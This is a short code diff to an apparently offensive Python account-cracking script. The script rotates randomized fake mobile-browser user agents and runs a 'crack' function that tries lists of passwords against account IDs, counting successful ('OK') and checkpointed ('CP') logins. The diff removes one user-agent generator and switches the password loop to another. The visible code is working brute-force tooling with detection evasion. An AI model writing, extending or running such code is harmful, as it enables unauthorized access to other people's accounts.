@@ -40,21 +40,6 @@ for x in range(10000):
 	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 	uaku = f'{A}{B}{C}{D}'
 	ugen.append(uaku)
-
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c='it-it; Redmi 8 Build/QKQ1.191014.001) PIXI '
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.6.4-gn'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen2.append(uaku2)
 def uaku():
 	try:
 		ua=open('bbnew.txt','r').read().splitlines()
@@ -482,7 +467,7 @@ def crack(idf,pwv):
 	global loop,ok,cp
 	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
-	ua = random.choice(ugen2)
+	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
